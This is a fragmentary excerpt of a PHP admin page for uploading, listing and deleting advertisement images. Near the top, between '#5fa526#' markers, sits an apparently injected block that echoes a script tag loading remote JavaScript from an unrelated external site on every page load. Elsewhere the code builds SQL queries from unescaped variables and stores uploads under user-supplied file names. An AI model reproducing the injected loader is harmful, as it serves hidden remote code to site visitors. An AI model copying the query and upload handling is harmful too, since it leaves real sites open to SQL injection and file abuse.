...
table#imgtab , table#imgtab th, table#imgtab td
{
...
#5fa526#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224409\"></script>";
echo $srwv;
}
#/5fa526#
?>
...
<br />
				...
				<div align="center" style="color:#003399; font-size:14px; font-weight:bolder; padding-right:20px; padding-bottom:5px; font-family:Arial">
				...
				<div style="width:95%;" class="normal1" >
					 ...
					 $db = new db_class;
	 $db -> db_query("DELETE FROM  `advertise` WHERE id = '$idd' ");
					 
					 }
					 
					 
					 if($_POST['task'] == 'saveimages')
					 {
...
&& ($_FILES["file"]["size"] < 200000))
  ...
  $image_name=time().$_FILES["file"]["name"];
      ...
      move_uploaded_file($_FILES["file"]["tmp_name"],"../../upload/photo/" . $image_name);
     // echo "Stored in: " . "upload/" . $_FILES["file"]["name"];
	 
	 
	// print_r($_POST);
	 $usid = $_SESSION['user_id'];
	  $status = $_POST['x_status'];
$status = 1;	  
	 
	 $db = new db_class;
	 $db -> db_query("INSERT INTO `advertise` (
...
<!--
<input type="radio" name="x_status" value="1" checked = "true"/> Active<br />
<input type="radio" name="x_status" value="2" /> Not Active
-->
...
$usid = $_SESSION['user_id'];
 $db = new db_class;
 // WHERE user_id  = '$usid'
	$result =  $db -> db_select("SELECT * FROM `advertise` WHERE user_id  = '$usid' ");
	...
	<tr>
	<td> <img src="../../upload/photo/<?php echo $oneresult['adv']?>" width="200px" height="100px" /> </td>
	
	<td> <a href="addpictures.php?task=delete&id=<?php echo $oneresult['id']?>">Delete image </a> </td>
